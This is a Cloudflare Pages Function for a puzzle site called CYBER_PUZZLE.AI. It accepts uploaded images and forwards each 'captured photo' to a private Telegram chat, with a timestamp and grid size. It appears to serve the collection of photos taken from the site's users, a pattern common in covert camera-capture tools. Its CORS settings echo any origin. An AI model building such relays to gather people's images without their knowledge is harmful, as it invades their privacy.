/**
 * Cloudflare Pages Function for CYBER_PUZZLE.AI Telegram Photo Delivery
 * Handles: /upload
 * 
 * Automatically executed by Cloudflare Pages on POST /upload, OPTIONS /upload, GET /upload
 * Secrets used: env.TELEGRAM_BOT_TOKEN, env.TELEGRAM_CHAT_ID
 */

// Helper to construct dynamic CORS headers for both GitHub Pages and local development
function getCorsHeaders(request) {
    const origin = request.headers.get('Origin') || '';
    
    // Default allowed origin is production GitHub Pages
    let allowOrigin = 'https://dhruv-coder-128.github.io';
    
    if (!origin || origin === 'null') {
        // Local file:/// execution or curl without Origin header
        allowOrigin = '*';
    } else if (
        origin === 'https://dhruv-coder-128.github.io' ||
        origin.endsWith('.github.io') ||
        origin.startsWith('http://localhost') ||
        origin.startsWith('http://127.0.0.1')
    ) {
        allowOrigin = origin;
    } else {
        // Echo origin for compatibility
        allowOrigin = origin;
    }

    return {
        'Access-Control-Allow-Origin': allowOrigin,
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
        'Access-Control-Max-Age': '86400',
        'Vary': 'Origin',
    };
}

// Helper to create JSON responses with required CORS headers
function jsonResponse(data, status = 200, request = null) {
    const corsHeaders = request ? getCorsHeaders(request) : {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
    };

    return new Response(JSON.stringify(data, null, 2), {
        status,
        headers: {
            'Content-Type': 'application/json',
            ...corsHeaders,
        },
    });
}

// Universal handler for Cloudflare Pages Functions
export async function onRequest(context) {
    const { request, env } = context;
    const corsHeaders = getCorsHeaders(request);

    // 1. Handle CORS Preflight (OPTIONS)
    if (request.method === 'OPTIONS') {
        return new Response(null, {
            status: 204,
            headers: corsHeaders,
        });
    }

    // 2. Health check (GET /upload)
    if (request.method === 'GET') {
        return jsonResponse({
            status: 'online',
            service: 'CYBER_PUZZLE.AI Telegram Delivery (Cloudflare Pages Function)',
            endpoint: 'POST /upload',
            corsAllowedOrigin: corsHeaders['Access-Control-Allow-Origin']
        }, 200, request);
    }

    // 3. Only allow POST for photo delivery
    if (request.method !== 'POST') {
        return jsonResponse({ error: 'Method not allowed. Use POST /upload' }, 405, request);
    }

    // 4. Verify server-side Cloudflare environment secrets
    if (!env.TELEGRAM_BOT_TOKEN || !env.TELEGRAM_CHAT_ID) {
        console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in Cloudflare secrets');
        return jsonResponse({
            error: 'Server configuration error',
            message: 'TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not configured in Cloudflare secrets.'
        }, 500, request);
    }

    // 5. Parse incoming request and extract image
    try {
        const contentType = request.headers.get('content-type') || '';
        let photo = null;
        let timestamp = new Date().toISOString();
        let gridSize = '3x3';

        if (contentType.includes('multipart/form-data')) {
            const formData = await request.formData();
            photo = formData.get('photo') || formData.get('image') || formData.get('file');
            timestamp = formData.get('timestamp') || timestamp;
            gridSize = formData.get('gridSize') || gridSize;
        } else if (contentType.includes('application/json')) {
            const body = await request.json();
            if (body.image || body.photo) {
                const rawBase64 = (body.image || body.photo).replace(/^data:image\/\w+;base64,/, '');
                const binary = Uint8Array.from(atob(rawBase64), c => c.charCodeAt(0));
                photo = new Blob([binary], { type: 'image/jpeg' });
            }
            timestamp = body.timestamp || timestamp;
            gridSize = body.gridSize || gridSize;
        } else {
            // Raw binary upload fallback
            const buffer = await request.arrayBuffer();
            if (buffer && buffer.byteLength > 0) {
                photo = new Blob([buffer], { type: 'image/jpeg' });
            }
        }

        if (!photo) {
            return jsonResponse({
                error: 'Bad Request',
                message: 'No photo provided in request. Expected multipart/form-data with field "photo".'
            }, 400, request);
        }

        // Format timestamp for display in Telegram caption
        let formattedTime = timestamp;
        try {
            formattedTime = new Date(timestamp).toLocaleString('en-US', {
                dateStyle: 'medium',
                timeStyle: 'medium'
            });
        } catch (e) {
            formattedTime = timestamp;
        }

        const caption = `📸 CYBER_PUZZLE.AI\nNew captured photo\nTime: ${formattedTime}\nGrid: ${gridSize}`;

        // Build Telegram Bot API form data
        const tgFormData = new FormData();
        tgFormData.append('chat_id', env.TELEGRAM_CHAT_ID);
        tgFormData.append('photo', photo, 'captured_puzzle.jpg');
        tgFormData.append('caption', caption);

        // 6. Dispatch to Telegram Bot API sendPhoto
        const tgUrl = `https://api.telegram.org/bot${env.TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const tgResponse = await fetch(tgUrl, {
            method: 'POST',
            body: tgFormData,
        });

        const tgResult = await tgResponse.json();

        if (!tgResponse.ok || !tgResult.ok) {
            console.error('Telegram API error:', tgResult);
            return jsonResponse({
                error: 'Telegram Delivery Failed',
                details: tgResult.description || 'Unknown Telegram API error'
            }, 500, request);
        }

        // 7. Return success
        return jsonResponse({
            success: true,
            message: 'Photo delivered to Telegram successfully'
        }, 200, request);

    } catch (error) {
        console.error('Pages function error:', error);
        return jsonResponse({
            error: 'Internal Server Error',
            message: error.message
        }, 500, request);
    }
}
